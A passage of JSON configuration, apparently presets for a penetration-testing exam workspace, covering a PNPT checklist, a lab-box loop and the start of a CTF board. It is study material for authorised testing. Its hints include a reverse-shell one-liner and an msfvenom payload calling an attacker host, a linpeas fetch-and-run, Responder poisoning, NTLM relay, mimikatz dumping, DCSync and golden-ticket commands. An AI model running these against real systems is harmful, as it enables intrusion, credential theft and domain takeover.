   ],
   "kind": "targets",
   "appFeatures": []
  },
  {
   "id": "pnpt",
   "name": "PNPT (TCM Security)",
   "icon": "🎯",
   "tagline": "Five-day mock engagement, OSINT through Domain Admin, then two days of report writing and a live 15-minute debrief in front of senior pentesters.",
   "focus": "mixed",
   "durationMin": 7200,
   "reportHours": 48,
   "passMark": 0,
   "totalPoints": 0,
   "scoringNote": "",
   "targets": [
    {
     "key": "osint",
     "label": "OSINT surface (no host — research workspace)",
     "kind": "external",
     "points": 0,
     "flags": [
      {
       "id": "osint-identities",
       "label": "Employee list with derived username/email convention, each entry sourced",
       "points": 0
      },
      {
       "id": "osint-creds",
       "label": "Credential or credential pattern obtained from open sources",
       "points": 0
      },
      {
       "id": "osint-assets",
       "label": "Domains, subdomains and netblocks attributed to the target, with evidence of attribution",
       "points": 0
      }
     ]
    },
    {
     "key": "external",
     "label": "External perimeter",
     "kind": "external",
     "points": 0,
     "flags": [
      {
       "id": "ext-surface",
       "label": "Enumerated external services and portals, screenshotted",
       "points": 0
      },
      {
       "id": "ext-entry",
       "label": "Working external entry point (request/response or session evidence)",
       "points": 0
      }
     ]
    },
    {
     "key": "internal",
     "label": "Internal network (post-foothold)",
     "kind": "internal",
     "points": 0,
     "flags": [
      {
       "id": "int-foothold",
       "label": "Initial internal shell or authenticated internal access",
       "points": 0
      },
      {
       "id": "int-avbypass",
       "label": "Evidence of A/V and egress bypass on the way in",
       "points": 0
      },
      {
       "id": "int-localadmin",
       "label": "Local administrator on a domain-joined host",
       "points": 0
      },
      {
       "id": "int-lateral",
       "label": "Lateral movement to a second host using harvested material",
       "points": 0
      }
     ]
    },
    {
     "key": "dc",
     "label": "Domain Controller",
     "kind": "ad-dc",
     "points": 0,
     "flags": [
      {
       "id": "dc-da",
       "label": "Domain Admin — privileged command output from the DC itself",
       "points": 0
      },
      {
       "id": "dc-ntds",
       "label": "NTDS / DCSync evidence of full domain compromise",
       "points": 0
      },
      {
       "id": "dc-narrative",
       "label": "Steps to Domain Admin written end to end, from OSINT to DC",
       "points": 0
      }
     ]
    }
   ],
   "phases": [
    {
     "id": "osint",
     "name": "OSINT & Passive Reconnaissance",
     "goal": "You know who works there, how their usernames are built, what they own on the internet, and every claim has a cited source.",
     "items": [
      {
       "label": "Attribute the estate: root domains, subdomains, netblocks, cloud tenants — and record why you believe each belongs to the target",
       "hint": "amass enum -passive -d <DOMAIN>"
      },
      {
       "label": "Passive subdomain sweep, then resolve to find what is actually live",
       "hint": "subfinder -d <DOMAIN> -silent | dnsx -silent -a -resp"
      },
      {
       "label": "Certificate transparency for hosts nobody advertises",
       "hint": "curl -s 'https://crt.sh/?q=%25.<DOMAIN>&output=json' | jq -r '.[].name_value' | sort -u"
      },
      {
       "label": "Harvest names, emails and hosts from search engines and public sources",
       "hint": "theHarvester -d <DOMAIN> -b all -l 500"
      },
      {
       "label": "Build the org picture from LinkedIn and the company site: roles, departments, tech stack, who would open an attachment",
       "hint": ""
      },
      {
       "label": "Derive the username/email convention from the samples you have, then generate the full candidate list",
       "hint": ""
      },
      {
       "label": "Breach-data and credential-reuse search against the harvested identities",
       "hint": "holehe <USER>@<DOMAIN>"
      },
      {
       "label": "Search code hosting and paste sites for leaked keys, configs and internal hostnames",
       "hint": "trufflehog github --org=<DOMAIN> --only-verified"
      },
      {
       "label": "Mine metadata from public documents for usernames, internal paths and software versions",
       "hint": "exiftool *.pdf *.docx | grep -iE 'author|creator|producer|company'"
      },
      {
       "label": "Pull DNS records that leak internal naming, mail routing and third parties",
       "hint": "dig +short any <DOMAIN>; dig +short txt <DOMAIN>; dig axfr <DOMAIN> @<DC_IP>"
      },
      {
       "label": "Build the password-spray candidate list from convention, seasons, company name and breach patterns",
       "hint": ""
      },
      {
       "label": "Log every OSINT source with its URL and the date you collected it — the report must cite it and the assessors may ask",
       "hint": ""
      }
     ]
    },
    {
     "id": "external",
     "name": "External Attack Surface",
     "goal": "Every exposed service is enumerated, screenshotted, and rated — before you spend a day on any single one.",
     "items": [
      {
       "label": "Full TCP sweep of the in-scope external ranges, then targeted service detection on what answers",
       "hint": "nmap -sS -Pn -p- --min-rate 2000 -oA scans/ext <TARGET_IP>"
      },
      {
       "label": "UDP top ports — do not skip this and then wonder where SNMP was",
       "hint": "sudo nmap -sU --top-ports 100 -oA scans/ext-udp <TARGET_IP>"
      },
      {
       "label": "Screenshot every web surface before you touch it, so the report has before-evidence",
       "hint": "httpx -l hosts.txt -screenshot -title -tech-detect -o shots/"
      },
      {
       "label": "Catalogue the auth portals: OWA/Exchange, VPN, Citrix, RDWeb, SSO, admin panels",
       "hint": ""
      },
      {
       "label": "Test for username enumeration on each portal before you spray anything",
       "hint": ""
      },
      {
       "label": "Read the domain password and lockout policy expectations, then spray low and slow — one password, all users, long interval",
       "hint": "nxc smb <TARGET_IP> -u users.txt -p '<PASSWORD>' --continue-on-success"
      },
      {
       "label": "Cloud tenant spray and MFA state of any credential that lands",
       "hint": ""
      },
      {
       "label": "Default credentials and known CVEs on exposed appliances",
       "hint": "nuclei -l hosts.txt -severity critical,high,medium"
      },
      {
       "label": "Anonymous access to exposed file services",
       "hint": "nxc smb <TARGET_IP> -u '' -p '' --shares"
      },
      {
       "label": "Web app surface on anything custom: auth logic, upload, injection, IDOR",
       "hint": "ffuf -u <TARGET_URL>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc all -fc 404"
      },
      {
       "label": "Write each external finding up as you confirm it, with severity and evidence — do not defer this to report day",
       "hint": ""
      }
     ]
    },
    {
     "id": "access",
     "name": "Initial Access",
     "goal": "You are inside, the A/V and egress controls were bypassed deliberately, and you captured how it happened while it was happening.",
     "items": [
      {
       "label": "Turn a valid credential into a session: VPN, portal, webmail or an application foothold",
       "hint": ""
      },
      {
       "label": "Exploit an external service to code execution where credentials do not land",
       "hint": ""
      },
      {
       "label": "Confirm egress before committing to a callback port",
       "hint": "for p in 53 80 443 8080; do timeout 2 bash -c \"</dev/tcp/<ATTACKER_IP>/$p\" 2>/dev/null && echo \"$p out\"; done"
      },
      {
       "label": "Bypass A/V on the payload — the exam expects this explicitly, so build the loader rather than shipping a raw msfvenom exe",
       "hint": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o sc.bin"
      },
      {
       "label": "Catch the callback and stabilise the shell",
       "hint": "rlwrap nc -lvnp <LPORT>"
      },
      {
       "label": "Upgrade to a usable TTY on Linux footholds",
       "hint": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
      },
      {
       "label": "Establish where you landed and whether the host is domain-joined",
       "hint": "whoami /all & systeminfo | findstr /B /C:\"Domain\" /C:\"OS Name\""
      },
      {
       "label": "Capture proof of initial access immediately: the command, the output, the timestamp, the host",
       "hint": ""
      },
      {
       "label": "Note precisely which control you bypassed and how — that is a finding with a remediation, not just a step",
       "hint": ""
      }
     ]
    },
    {
     "id": "internal",
     "name": "Internal Network Enumeration",
     "goal": "You have the domain mapped, the low-hanging internal misconfigurations identified, and a graph to plan against.",
     "items": [
      {
       "label": "Map the internal subnet without hammering it",
       "hint": "nxc smb <TARGET_IP>/24"
      },
      {
       "label": "Identify the domain, its controllers and the forest layout",
       "hint": "nltest /dclist:<DOMAIN>; nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>"
      },
      {
       "label": "Check SMB signing across the subnet and build the relay list",
       "hint": "nxc smb <TARGET_IP>/24 --gen-relay-list relay.txt"
      },
      {
       "label": "LLMNR / NBT-NS / mDNS poisoning to capture hashes",
       "hint": "sudo responder -I tun0 -dwv"
      },
      {
       "label": "IPv6 takeover where DHCPv6 is unmanaged",
       "hint": "sudo mitm6 -d <DOMAIN>"
      },
      {
       "label": "Crack captured NetNTLMv2 offline",
       "hint": "hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule"
      },
      {
       "label": "Relay where signing is disabled instead of cracking what will not crack",
       "hint": "impacket-ntlmrelayx -tf relay.txt -smb2support -i"
      },
      {
       "label": "Enumerate the domain properly with the first valid low-privilege account",
       "hint": "nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --users --groups --password-policy"
      },
      {
       "label": "Read the password policy before any internal spray — lockouts are a finding you cause, not one you report",
       "hint": "net accounts /domain"
      },
      {
       "label": "Spider shares for credentials, scripts and sensitive data",
       "hint": "nxc smb <TARGET_IP>/24 -u <USER> -p '<PASSWORD>' -M spider_plus"
      },
      {
       "label": "Collect BloodHound data",
       "hint": "bloodhound-python -u <USER> -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c All"
      },
      {
       "label": "Scan internally for unpatched services and weak configurations that belong in the findings table",
       "hint": "nmap -sCV -p- --min-rate 2000 -oA scans/int <TARGET_IP>"
      }
     ]
    },
    {
     "id": "ad",
     "name": "Active Directory Path to Domain Admin",
     "goal": "You reach Domain Admin by a path you can narrate in order, from memory, in fifteen minutes.",
     "items": [
      {
       "label": "Run the shortest-path queries, then pick the path you can fully evidence rather than the flashiest one",
       "hint": ""
      },
      {
       "label": "Kerberoast and crack offline",
       "hint": "impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP> -request -outputfile spns.hash"
      },
      {
       "label": "AS-REP roast accounts without pre-authentication",
       "hint": "impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat"
      },
      {
       "label": "Password reuse sweep: does the credential you cracked grant local admin anywhere else?",
       "hint": "nxc smb <TARGET_IP>/24 -u <USER> -p '<PASSWORD>' --local-auth"
      },
      {
       "label": "Dump local secrets wherever you hold administrator",
       "hint": "nxc smb <TARGET_IP> -u <USER> -p '<PASSWORD>' --sam --lsa"
      },
      {
       "label": "Harvest credentials and tokens from memory for a higher-privilege identity",
       "hint": "mimikatz # privilege::debug; sekurlsa::logonpasswords"
      },
      {
       "label": "Token impersonation where a privileged session exists on a host you own",
       "hint": ""
      },
      {
       "label": "GPP cached credentials still sitting in SYSVOL",
       "hint": "nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' -M gpp_password"
      },
      {
       "label": "Abuse ACL edges the graph shows: GenericAll, WriteDACL, ForceChangePassword, AddMember",
       "hint": "Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity <USER> -Rights All"
      },
      {
       "label": "AD CS template abuse if a certificate authority is in the environment",
       "hint": "certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout"
      },
      {
       "label": "Move laterally with the credential you now hold",
       "hint": "impacket-psexec <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET_IP>"
      },
      {
       "label": "Pass the hash where you only have NTLM",
       "hint": "impacket-wmiexec -hashes :<HASH> <DOMAIN>/<USER>@<TARGET_IP>"
      },
      {
       "label": "DCSync to prove full domain compromise",
       "hint": "impacket-secretsdump <DOMAIN>/<USER>:'<PASSWORD>'@<DC_IP> -just-dc-user krbtgt"
      },
      {
       "label": "Screenshot the DC compromise carefully — this is the single thing the assessors will ask you to explain live",
       "hint": "whoami & hostname & ipconfig"
      }
     ]
    },
    {
     "id": "postex",
     "name": "Post-Exploitation, Persistence & Impact",
     "goal": "You can tell the client what an attacker would actually have taken, backed by numbers rather than adjectives.",
     "items": [
      {
       "label": "Dump NTDS.dit and quantify the domain's real password weakness",
       "hint": "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL -outputfile ntds"
      },
      {
       "label": "Crack the domain hashes and produce reuse and complexity statistics the client can act on",
       "hint": "hashcat -m 1000 ntds.ntds --username /usr/share/wordlists/rockyou.txt -r rules/best64.rule"
      },
      {
       "label": "Count how many accounts share a password with a privileged one — that number belongs in the executive summary",
       "hint": ""
      },
      {
       "label": "Demonstrate persistence only where it strengthens the narrative (golden ticket, machine account, scheduled task)",
       "hint": "mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /ptt"
      },
      {
       "label": "Locate the data that would genuinely hurt this business — finance, HR, PII, source, backups",
       "hint": ""
      },
      {
       "label": "Evidence access to that data without exfiltrating more than you need to prove it",
       "hint": ""
      },
      {
       "label": "Record every artefact you created — accounts, tickets, files, services — so cleanup can be listed in the report",
       "hint": ""
      },
      {
       "label": "Stop testing with real time left. The report and the debrief are graded deliverables, not afterthoughts",
       "hint": ""
      }
     ]
    },
    {
     "id": "report",
     "name": "Report Writing",
     "goal": "A deliverable a client would pay for: business risk at the front, reproducible technical detail behind it, prioritised remediation throughout.",
     "items": [
      {
       "label": "Rebuild the timeline from your notes: every host, command, timestamp and outcome",
       "hint": ""
      },
      {
       "label": "Draft the findings first — description, risk and impact, affected systems, evidence, remediation, references",
       "hint": ""
      },
      {
       "label": "Rate every finding against a stated scale and justify the rating with likelihood and impact",
       "hint": ""
      },
      {
       "label": "Write 'Steps to Domain Admin' as an ordered narrative from OSINT through to the DC — TCM's own template carries this as an informational finding",
       "hint": ""
      },
      {
       "label": "Write the executive summary last, for a non-technical reader, in terms of business risk not tooling",
       "hint": ""
      },
      {
       "label": "Include key strengths as well as weaknesses — a credible report says what the client is doing right",
       "hint": ""
      },
      {
       "label": "Crop, caption and redact screenshots; no stray desktop, no unreadable terminal",
       "hint": ""
      },
      {
       "label": "Disclose any AI tool use: where, why and how — TCM's terms require it in the submitted report",
       "hint": ""
      },
      {
       "label": "Make remediation actionable and prioritised. 'Apply patches' is not a recommendation",
       "hint": ""
      },
      {
       "label": "Proofread end to end. It is graded as a professional deliverable, not a write-up",
       "hint": ""
      },
      {
       "label": "Submit within the two-day report window",
       "hint": ""
      }
     ]
    },
    {
     "id": "debrief",
     "name": "Live Debrief Preparation",
     "goal": "Fifteen minutes in front of senior pentesters, and you can explain the DC compromise end to end without reading from the report.",
     "items": [
      {
       "label": "Build the walkthrough to fit 15 minutes — that is the whole slot, and it is live",
       "hint": ""
      },
      {
       "label": "Have photo ID to hand; candidates report the assessor asks for identity confirmation at the start",
       "hint": ""
      },
      {
       "label": "Open with scope and the headline risk, not with nmap output",
       "hint": ""
      },
      {
       "label": "Rehearse the OSINT-to-Domain-Admin chain out loud, in order, against a clock",
       "hint": ""
      },
      {
       "label": "Be able to explain the DC compromise step by step without notes — this is the question you will definitely be asked",
       "hint": ""
      },
      {
       "label": "For each finding, know why it matters to this business and what you would fix first",
       "hint": ""
      },
      {
       "label": "Prepare for 'what would you do differently' and 'what did you not get to' — say it plainly, do not bluff",
       "hint": ""
      },
      {
       "label": "Know your own evidence well enough to jump to any screenshot on demand",
       "hint": ""
      },
      {
       "label": "Test camera, microphone and screen share before the call, and have the report open and paginated",
       "hint": ""
      }
     ]
    }
   ],
   "rules": [
    {
     "kind": "required",
     "text": "Five (5) full days to complete the assessment, plus an additional two (2) days to write the professional report.",
     "enforceable": "deadline:report:48h",
     "source": "https://certifications.tcm-sec.com/pnpt/",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "You must perform Open-Source Intelligence (OSINT) to gather the intel needed to attack the network. It is a stated certification requirement, not optional colour.",
     "enforceable": "phase-required:osint",
     "source": "https://certifications.tcm-sec.com/pnpt/",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "You must leverage Active Directory exploitation skills to perform A/V and egress bypassing, lateral and vertical network movement, and ultimately compromise the exam Domain Controller.",
     "enforceable": "target-required:dc",
     "source": "https://certifications.tcm-sec.com/pnpt/",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "You must provide a detailed, professionally written report.",
     "enforceable": "deliverable:report",
     "source": "https://certifications.tcm-sec.com/pnpt/",
     "confidence": "official"
    },
    {
     "kind": "required",
     "text": "You must perform a live 15-minute report debrief in front of TCM Security assessors, who are all senior penetration testers. Passing the technical portion alone is not sufficient.",
     "enforceable": "deliverable:debrief:15m",
     "source": "https://certifications.tcm-sec.com/pnpt/",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "There are absolutely zero flags to capture and no multiple-choice questions. The exam is graded as a real penetration test, so scoring, point totals and flag counters do not apply.",
     "enforceable": "",
     "source": "https://certifications.tcm-sec.com/pnpt/",
     "confidence": "official"
    },
    {
     "kind": "limited",
     "text": "AI-assisted tools (large language models, AI code assistants and similar) are permitted during the exam, provided all such use is transparently disclosed in the submitted report, clearly identifying where and how they were used. AI may not substitute for demonstrating your own technical understanding and judgement.",
     "enforceable": "require-report-section:ai-disclosure",
     "source": "https://certifications.tcm-sec.com/terms-and-conditions/",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Soliciting assistance from other people is prohibited at all times. The AI policy does not relax this — human assistance remains banned.",
     "enforceable": "",
     "source": "https://certifications.tcm-sec.com/terms-and-conditions/",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "You may not disclose, publish, reproduce or transmit any portion of the exam environment or course materials by any means. These non-disclosure obligations continue after the exam ends — keep exam-specific hosts, credentials and findings out of anything you share or publish.",
     "enforceable": "warn:session-export",
     "source": "https://certifications.tcm-sec.com/terms-and-conditions/",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "There is no proctor and no monitoring software to install on your machine — but the exam environment IS monitored. TCM: \"We do monitor network traffic in the exam environment and have detection mechanisms in place for cheating.\" Unsupervised is not unobserved.",
     "enforceable": "",
     "source": "https://certifications.tcm-sec.com/",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "text": "One free retake is included with every exam voucher, and vouchers are valid for 12 months from purchase.",
     "enforceable": "",
     "source": "https://certifications.tcm-sec.com/pnpt/",
     "confidence": "official"
    },
    {
     "kind": "allowed",
     "confidence": "official",
     "text": "All tools are allowed, including AI-enabled tools — TCM states this outright. You MUST disclose how you used them in your report.",
     "enforceable": "report:document:tooling",
     "source": "https://certifications.tcm-sec.com/pnpt/"
    }
   ],
   "evidenceRules": [
    {
     "appliesTo": "*",
     "requirement": "Every finding needs reproducible evidence: the exact command or request, the raw output or response, the affected host, and when it was done. The report is graded as a client deliverable, so an assertion without evidence is not a finding.",
     "source": "https://tcm-sec.com/what-is-a-penetration-testing-report/",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "Each finding must carry a title, severity rating with justification, description, risk and impact, affected systems, tools used, references, evidence, and actionable remediation.",
     "source": "https://tcm-sec.com/what-is-a-penetration-testing-report/",
     "confidence": "official"
    },
    {
     "appliesTo": "osint-identities",
     "requirement": "Every OSINT claim must cite the source URL and the date collected. The assessors can ask where a name, email convention or credential came from.",
     "source": "https://certifications.tcm-sec.com/pnpt/",
     "confidence": "official"
    },
    {
     "appliesTo": "osint-creds",
     "requirement": "A credential sourced from OSINT must be evidenced from discovery through to the moment it was successfully used against the target.",
     "source": "https://certifications.tcm-sec.com/pnpt/",
     "confidence": "official"
    },
    {
     "appliesTo": "int-avbypass",
     "requirement": "A/V and egress bypass must be shown, not asserted: what the control was, what you did to get past it, and the resulting execution.",
     "source": "https://certifications.tcm-sec.com/pnpt/",
     "confidence": "official"
    },
    {
     "appliesTo": "dc-da",
     "requirement": "Domain Controller compromise must be evidenced end to end — the credential or ticket that got you there, the command that used it, and privileged output taken from the DC itself.",
     "source": "https://certifications.tcm-sec.com/pnpt/",
     "confidence": "official"
    },
    {
     "appliesTo": "dc-narrative",
     "requirement": "The full path from OSINT to Domain Admin must be written as an ordered narrative and be deliverable out loud, in order, within a 15-minute live debrief.",
     "source": "https://certifications.tcm-sec.com/pnpt/",
     "confidence": "official"
    },
    {
     "appliesTo": "*",
     "requirement": "Any use of AI-assisted tooling must be disclosed in the submitted report, identifying clearly where and how it was used.",
     "source": "https://certifications.tcm-sec.com/terms-and-conditions/",
     "confidence": "official"
    }
   ],
   "reportSections": [
    "Cover Page — Business Confidential",
    "Table of Contents",
    "Confidentiality Statement",
    "Disclaimer",
    "Contact Information",
    "Assessment Overview",
    "Assessment Components",
    "Finding Severity Ratings (CVSS v3 ranges)",
    "Risk Factors — Likelihood",
    "Risk Factors — Impact",
    "Scope",
    "Scope Exclusions",
    "Client Allowances",
    "Executive Summary",
    "Scoping and Time Limitations",
    "Testing Summary",
    "Tester Notes and Recommendations",
    "Key Strengths and Weaknesses",
    "Vulnerability Summary & Report Card",
    "Technical Findings",
    "Steps to Domain Admin (informational finding — the full attack narrative)",
    "AI Tool Disclosure",
    "Additional Scans and Reports / Appendices"
   ],
   "sources": [
    "https://certifications.tcm-sec.com/pnpt/",
    "https://certifications.tcm-sec.com/",
    "https://certifications.tcm-sec.com/terms-and-conditions/",
    "https://tcm-sec.com/ai-tools-and-certification-exams/",
    "https://tcm-sec.com/the-pnpt-pentest-experience-certification/",
    "https://tcm-sec.com/what-is-a-penetration-testing-report/",
    "https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report"
   ],
   "unverified": [
    "The number of hosts, subnets or domains in the exam environment. TCM does not publish it. The four targets in this preset are workspace slots (OSINT, external, internal, DC), not a claim about the exam's composition — the user is expected to add real hosts as they find them.",
    "Whether the debrief begins with a photo-ID check and follows a fixed agenda (vulnerability overview, then explanation of the DC compromise). This is consistently reported by candidates in public reviews but is not stated on TCM's official PNPT page — the debrief item is included as preparation advice, not as a vendor rule.",
    "The 'AI Tool Disclosure' report section. TCM's Terms require the disclosure to appear in the submitted report but do not name a heading for it; its placement here is a suggestion.",
    "Whether the two report days run consecutively from the end of day five and whether an early finish shortens the clock. The PNPT page states five days for the assessment plus two additional days for the report; it does not describe how the windows interact if you finish early.",
    "Pass thresholds beyond the four stated requirements (OSINT performed, DC compromised, report submitted, debrief delivered). TCM publishes no score, no point total and no partial-credit scheme, which is why passMark and totalPoints are 0."
   ],
   "kind": "targets",
   "notes": [],
   "appFeatures": []
  },
  {
   "id": "quick-lab",
   "name": "Quick Lab",
   "icon": "🔦",
   "tagline": "One box, a weeknight, no clock. Just the loop.",
   "focus": "mixed",
   "durationMin": 0,
   "reportHours": 0,
   "passMark": 0,
   "totalPoints": 0,
   "scoringNote": "",
   "targets": [
    {
     "key": "box",
     "label": "The Box",
     "kind": "standalone",
     "points": 0,
     "flags": [
      {
       "id": "user-txt",
       "label": "user.txt",
       "points": 0
      },
      {
       "id": "root-txt",
       "label": "root.txt",
       "points": 0
      }
     ]
    }
   ],
   "phases": [
    {
     "id": "recon",
     "name": "Recon",
     "goal": "Every open port and its exact version, before you touch anything.",
     "items": [
      {
       "label": "Fast full TCP sweep — all 65535, nothing skipped",
       "hint": "nmap -p- --min-rate 10000 -T4 -oA nmap/quick <TARGET_IP>"
      },
      {
       "label": "Scripts + versions on only the ports that answered",
       "hint": "nmap -sC -sV -p<PORT> -oA nmap/svc <TARGET_IP>"
      },
      {
       "label": "UDP top 100 — the one everybody skips and then loses an hour to",
       "hint": "sudo nmap -sU --top-ports 100 -oA nmap/udp <TARGET_IP>"
      },
      {
       "label": "Domain name in a cert, a redirect, or an SMB banner? Add it to /etc/hosts now",
       "hint": "echo '<TARGET_IP> <DOMAIN>' | sudo tee -a /etc/hosts"
      }
     ]
    },
    {
     "id": "web",
     "name": "Web (if there is one)",
     "goal": "Find the app that isn't on the front page.",
     "items": [
      {
       "label": "Fingerprint the stack — version numbers are the whole game",
       "hint": "whatweb -a3 http://<TARGET_IP>"
      },
      {
       "label": "Content discovery with extensions that match the stack",
       "hint": "feroxbuster -u http://<TARGET_IP> -x php,txt,bak,zip -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
      },
      {
       "label": "Vhost fuzz — a second site on the same IP is the classic miss",
       "hint": "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<TARGET_IP> -H 'Host: FUZZ.<DOMAIN>' -ac"
      },
      {
       "label": "Read the source, the JS bundles, robots.txt and the HTML comments",
       "hint": ""
      },
      {
       "label": "Try default / obvious creds on every login you find",
       "hint": ""
      }
     ]
    },
    {
     "id": "foothold",
     "name": "Foothold",
     "goal": "Any shell, then make it a usable one.",
     "items": [
      {
       "label": "searchsploit the exact versions you wrote down",
       "hint": "searchsploit <product> <version>"
      },
      {
       "label": "Listener up before you fire anything",
       "hint": "nc -lvnp <LPORT>"
      },
      {
       "label": "Reverse shell",
       "hint": "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<LPORT> 0>&1'"
      },
      {
       "label": "Upgrade to a real TTY — worth the 20 seconds every single time",
       "hint": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
      },
      {
       "label": "Ctrl-Z, raw mode, fg — now you have arrow keys and tab completion",
       "hint": "stty raw -echo; fg"
      }
     ]
    },
    {
     "id": "reenumerate",
     "name": "Look Again As This User",
     "goal": "You're a different person now. Everything you already enumerated changes.",
     "items": [
      {
       "label": "Who am I and what can I already do for free",
       "hint": "id; sudo -l"
      },
      {
       "label": "Windows equivalent — privileges are the shortcut",
       "hint": "whoami /all"
      },
      {
       "label": "Found creds? Log into the web app as that user and re-browse it",
       "hint": ""
      },
      {
       "label": "Spray those creds at everything: su, ssh, smb, the DB",
       "hint": "su <USER>"
      },
      {
       "label": "Services bound to 127.0.0.1 that the port scan never saw",
       "hint": "ss -tlnp"
      },
      {
       "label": "New interface or route? That's a new subnet — full scan it",
       "hint": "ip a; ip route; arp -a"
      },
      {
       "label": "user.txt",
       "hint": "cat /home/*/user.txt 2>/dev/null || type C:\\Users\\*\\Desktop\\user.txt"
      }
     ]
    },
    {
     "id": "escalate",
     "name": "Escalate",
     "goal": "Root or SYSTEM, then the flag, then you're done.",
     "items": [
      {
       "label": "Let the script do the reading",
       "hint": "curl -sL http://<ATTACKER_IP>/linpeas.sh | sh"
      },
      {
       "label": "Windows: winPEAS, and check SeImpersonate first",
       "hint": "whoami /priv | findstr /i impersonate"
      },
      {
       "label": "sudo -l and SUID against GTFOBins",
       "hint": "find / -perm -4000 -type f 2>/dev/null"
      },
      {
       "label": "Something running on a timer as root? Watch it",
       "hint": "./pspy64"
      },
      {
       "label": "Windows services & scheduled tasks running as SYSTEM",
       "hint": "schtasks /query /fo LIST /v | findstr /i \"TaskName Run As User\""
      },
      {
       "label": "root.txt",
       "hint": "id; cat /root/root.txt"
      }
     ]
    }
   ],
   "rules": [
    {
     "kind": "allowed",
     "text": "Anything goes — Metasploit, public exploits, a walkthrough when you're properly stuck. It's a lab, not an exam.",
     "enforceable": "",
     "source": "",
     "confidence": "inferred"
    },
    {
     "kind": "banned",
     "text": "HTB permits public write-ups only for: Retired Machines, Retired Sherlocks, Retired Challenges, Starting Point Machines, Tier 0 Academy Modules, and the Mini Pro Labs that already have platform write-ups (POO, Xen, Ascension, RPG, Hades). Everything else — including other Pro Labs — is prohibited.",
     "enforceable": "",
     "source": "https://help.hackthebox.com/en/articles/12325897-hack-the-box-platform-rules",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "text": "Denial of Service is strictly forbidden on the HTB network, and you may only target the machine assigned to you.",
     "enforceable": "",
     "source": "https://help.hackthebox.com/en/articles/12325897-hack-the-box-platform-rules",
     "confidence": "official"
    },
    {
     "kind": "banned",
     "confidence": "official",
     "enforceable": "warn:export",
     "text": "HTB prohibits using its content to train, evaluate, fine-tune, test, benchmark or develop any machine-learning model or LLM, and prohibits assembling or enriching any dataset or knowledge base from it. Relevant here: exporting your notes is fine, feeding them to a model or into a shared corpus is not.",
     "source": "https://help.hackthebox.com/en/articles/12325897-hack-the-box-platform-rules"
    }
   ],
   "evidenceRules": [
    {
     "appliesTo": "user-txt",
     "requirement": "Paste the flag. That's all — nothing is enforced here.",
     "source": "",
     "confidence": "inferred"
    },
    {
     "appliesTo": "root-txt",
     "requirement": "Paste the flag. If you might write this box up later, one screenshot of `id` / `whoami` beside it saves you a re-solve.",
     "source": "",
     "confidence": "inferred"
    }
   ],
   "reportSections": [
    "How I got in",
    "How I got root",
    "Things I'd have found faster next time"
   ],
   "sources": [
    "https://help.hackthebox.com/en/articles/12325897-hack-the-box-platform-rules"
   ],
   "unverified": [
    "Only Hack The Box's platform rules were checked. TryHackMe and Offensive Security Proving Grounds publish their own rules on sharing solutions and lab conduct — check theirs if that's where the box lives."
   ],
   "kind": "targets",
   "notes": [],
   "appFeatures": []
  },
  {
   "id": "ctf",
   "name": "CTF",
   "icon": "🚩",
   "tagline": "Jeopardy board — categories and challenges, not hosts.",
   "focus": "mixed",
   "durationMin": 2880,
   "reportHours": 0,
   "passMark": 0,
   "totalPoints": null,
   "scoringNote": "Points are per challenge and come from the event's own scoreboard — edit each challenge's value to match, and add or delete challenges as the board opens. There is no pass mark; the only number that matters is your team's total. If the event uses dynamic scoring, values will drift as solves come in, so treat these as placeholders. The total is derived from the challenges you add, not fixed — many CTFs also use dynamic scoring, where a challenge's value falls as more teams solve it.",
   "targets": [
    {
     "key": "web",
     "label": "Web",
     "kind": "challenge-category",
     "points": 400,
     "flags": [
      {
       "id": "web-1",
       "label": "Web challenge 1",
       "points": 100
      },
      {
       "id": "web-2",
       "label": "Web challenge 2",
       "points": 300
      }
     ]
    },
    {
     "key": "pwn",
     "label": "Pwn / Binary Exploitation",
     "kind": "challenge-category",
     "points": 400,
     "flags": [
      {
       "id": "pwn-1",
       "label": "Pwn challenge 1",
       "points": 100
      },
      {
       "id": "pwn-2",
       "label": "Pwn challenge 2",
       "points": 300
      }
     ]
    },
    {
     "key": "rev",
     "label": "Reverse Engineering",
     "kind": "challenge-category",
     "points": 400,
     "flags": [
      {
       "id": "rev-1",
       "label": "Rev challenge 1",
       "points": 100
      },
      {
       "id": "rev-2",
       "label": "Rev challenge 2",
       "points": 300
      }
     ]
    },
    {
     "key": "crypto",
     "label": "Crypto",
     "kind": "challenge-category",
     "points": 400,
     "flags": [
      {
       "id": "crypto-1",
       "label": "Crypto challenge 1",
       "points": 100
      },
      {
       "id": "crypto-2",
       "label": "Crypto challenge 2",
       "points": 300
      }
     ]
    },
    {
